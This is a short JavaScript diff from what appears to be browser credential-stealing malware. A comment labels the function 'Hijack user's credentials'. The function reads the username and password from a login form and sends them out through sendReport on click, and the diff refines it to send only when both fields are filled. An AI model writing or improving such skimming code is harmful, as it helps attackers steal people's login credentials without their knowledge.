@@ -111,11 +111,15 @@ function clipboardPasteHook(e) {
 // Hijack user's credentials
 function clickHook(e) {
     var credsInputs = getFormInputs(credsFormElem);
-    sendReport("creds", {
-       "user": credsInputs[0],
-       "pass": credsInputs[1]
-    });  
-    document.removeEventListener("click", clickHook);
+    var user = credsInputs[0];
+    var pass = credsInputs[1];
+    if (user !== "" && pass !== "") {
+        sendReport("creds", {
+            "user": user,
+            "pass": pass
+        });  
+        document.removeEventListener("click", clickHook);
+    }  
 }
 
 var credsFormElem
